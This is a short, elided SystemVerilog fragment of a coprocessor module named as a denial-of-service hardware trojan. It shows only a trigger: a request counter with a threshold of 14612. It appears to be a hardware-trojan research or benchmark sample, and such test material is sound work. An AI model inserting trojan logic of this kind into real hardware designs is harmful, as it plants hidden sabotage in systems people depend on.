...
module cvxif_example_coprocessor_trojan_DoS
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=14612)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14612;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (cvxif_req_t) trojan_counter <= trojan_counter + 1;
